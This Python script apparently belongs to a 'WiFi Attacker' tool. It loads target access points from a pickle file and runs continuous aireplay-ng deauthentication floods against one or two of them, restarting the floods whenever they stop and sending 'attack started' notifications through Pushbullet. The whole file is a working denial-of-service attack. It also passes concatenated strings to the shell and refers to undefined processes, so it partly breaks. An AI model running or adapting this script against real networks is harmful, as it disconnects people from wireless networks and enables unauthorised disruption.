#!/usr/bin/env python3
import subprocess
import time
import requests
import json
import pickle
import os
import signal

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


with open('variables.pkl', 'rb') as f:
    selected_targets_number, target_bssid, target_essid, target_ch, card, token = pickle.load(f)


def pushbullet_message(message):
    msg = {"type": "note", "title": "WiFi Attacker", "body": message}
    resp = requests.post('https://api.pushbullet.com/v2/pushes',
                         data=json.dumps(msg),
                         headers={'Authorization': 'Bearer ' + token,
                                  'Content-Type': 'application/json'})
    if resp.status_code != 200:
        raise Exception('Error',resp.status_code)


print(f"{bcolors.WARNING} [i] AIR ATTACK ON SELECTED TARGET(S) STARTED!{bcolors.ENDC}", flush=True)

aireplay1_message_exception = False
aireplay2_message_exception = False
aireplay1_working_bool = False
aireplay2_working_bool = False
target0 = selected_targets_number[0]
try:
    target1 = selected_targets_number[1]
    double_target = True
except IndexError:
    double_target = False

while True:
    if not aireplay1_working_bool:
        deauth_1 = subprocess.Popen(['aireplay-ng -0 0 -a ' + target_bssid[target0] + " " + card],
                                     stdout = subprocess.PIPE,
                                     universal_newlines = True,
                                     shell = True,
                                     preexec_fn = os.setsid)
        time.sleep(2)
        if deauth_1.poll() is None:
            aireplay1_working_bool = True

        if double_target and not aireplay2_working_bool:
            deauth_2 = subprocess.Popen(['aireplay-ng -0 0 -a ' + target_bssid[target1] + " " + card],
                                         stdout = subprocess.PIPE,
                                         universal_newlines = True,
                                         shell = True,
                                         preexec_fn = os.setsid)
        time.sleep(2)
        if deauth_2.poll() is None:
            aireplay2_working_bool = True

        if aireplay1_working_bool and not aireplay1_message_exception:
            print(f"{bcolors.WARNING}     Attack to 1st target started.{bcolors.ENDC}")
            aireplay1_message_exception = True
            pushbullet_message("Attack on first target started")

        if double_target and aireplay2_working_bool and not aireplay2_message_exception:
            bool2 = True
            aireplay2_message_exception = True
            print(f"{bcolors.WARNING}     Attack on 2nd target started.{bcolors.ENDC}")
            pushbullet_message("Attack on second target started")

        if double_target:
            if deauth_2.poll() is None:
                aireplay2_working_bool = True
            else:
                aireplay2_working_bool = False

    try:
        os.killpg(os.getpgid(deauth_2.pid), signal.SIGTERM)
    except ProcessLookupError:
        print("", end="")

    if deauth_1.poll() is None:
        aireplay1_working_bool = True
    else:
        aireplay1_working_bool = False
        try:
            os.killpg(os.getpgid(deauth_1.pid), signal.SIGTERM)
        except ProcessLookupError:
            print("", end="")

    if not double_target:
        if deauth_1.poll() is None:
            aireplay1_working_bool = True
        else:
            aireplay1_working_bool = False
            try:
                os.killpg(os.getpgid(airodump_ng.pid), signal.SIGTERM)
            except ProcessLookupError:
                print("", end="")
